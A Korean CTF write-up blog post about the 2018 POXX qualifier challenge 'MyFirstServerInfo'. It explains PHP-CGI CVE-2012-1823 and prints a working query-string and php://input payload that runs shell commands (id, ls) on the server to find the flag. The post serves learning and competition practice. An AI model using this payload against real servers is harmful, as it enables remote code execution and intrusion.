---
layout: post
title: ! "[CTF] 2018 POXX 예선 MyFirstServerInfo write up"
categories: [CTF]
excerpt: " "
comments: true
share: true
tags:
  - Web-hacking
  - CTF
  - POXX
  - write-up
---

2018년도 Power of XX 의 예선에 참가했습니다. 작년엔 본선에 진출했으나 올해는 아쉽게도 예선만 참가하게 됐네요 :(
이 문제는 저에게 의미있는 문제가 될 것 같아요. 왜냐하면 공식적인 대회에서 플래그를 찾아낸 첫번째 문제거든요!
문제 이름에도 First가 들어가고..ㅎㅎ 앞으로 플래그를 보는게 익숙해졌으면 좋겠네요

![]({{ site.baseurl }}/assets/posts/ctf/POXX2018/phpinfo.png)

문제 페이지에 들어가면 `phpinfo`가 보인다.
지금까지 phpinfo 관련 문제들은 꽤 봐왔으나, 그때마다 이걸 보고 뭘 알아낼 수 있지? 어떻게 공격하지? 라는 생각만 들었다.
그래도 이번엔 열심히 취약점을 찾아봐야겠다는 생각으로 자세히 보니 cgi 라는게 많이 보였다.
cgi를 처음 알게 된건 이번 학기 네트워크 수업 실습때였는데, cgi를 사용하여 python과 html을 같이 쓰는거였다.

`cgi`란 공용 게이트웨이 인터페이스(Common Gateway interface)의 약자로 웹 서버 상에서 사용자 프로그램을 동작시키기 위한 조합이다.

그래서 cgi 취약점에 대해 찾아보다가 PHP-CGI(CVE-2012-1823) 취약점에 대해 포스팅한 글을 보게되었다.
[참고](https://m.blog.naver.com/PostView.nhn?blogId=heapskewl73&logNo=221130879514&proxyReferer=https%3A%2F%2Fwww.google.co.kr%2F)


취약점 요약: 2012년 1월 PHP 5.4.2 이전 버전에서 원격 코드 실행이 가능한 취약점이 발견됐다. 이 취약점은 sapi/cgi/cgi_main.c 파일 내의 CGI 스크립트(php-cgi)가 -s,-d,-c 등의 매개 변수를 적절히 검증하지 않아 발생한다.

1. 취약점 대상
![]({{ site.baseurl }}/assets/posts/ctf/POXX2018/php-table1.png)

2. 취약점 공격
### php-cgi 주요 옵션
![]({{ site.baseurl }}/assets/posts/ctf/POXX2018/php-table2.png)

### php.ini 주요 설정
![]({{ site.baseurl }}/assets/posts/ctf/POXX2018/php-table3.png)

위 옵션들을 바탕으로 문제 페이지에 넘겨보면

![]({{ site.baseurl }}/assets/posts/ctf/POXX2018/php-s.png)

-s 옵션의 경우 색깔은 안입혀지지만 소스코드가 보이는 것을 확인할 수 있다.

![]({{ site.baseurl }}/assets/posts/ctf/POXX2018/php-burp-id.png)
-d 과 allow_url_include=1, auto_prepend_file=php://input 을 사용해 시스템 함수를 사용할 수 있다.
`?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input`
`<?php $contents = shell_exec("id"); echo "$contents"; die;`

![]({{ site.baseurl }}/assets/posts/ctf/POXX2018/php-id.png)

이 결과를 이용해 ls를 하면 파일 리스트가 뜨지 않을까 싶었다.

![]({{ site.baseurl }}/assets/posts/ctf/POXX2018/php-burp-ls.png)

`<?php $contents = shell_exec("ls"); echo "$contents"; die;`

![]({{ site.baseurl }}/assets/posts/ctf/POXX2018/php-ls.png)

index.php 파일과 알파벳+숫자로 이루어진 텍스트 파일이 있는 것을 확인할 수 있다.
다행히 바로 저 파일에 접근할 수 있었다.

![]({{ site.baseurl }}/assets/posts/ctf/POXX2018/php-flag.png)

플래그 :)
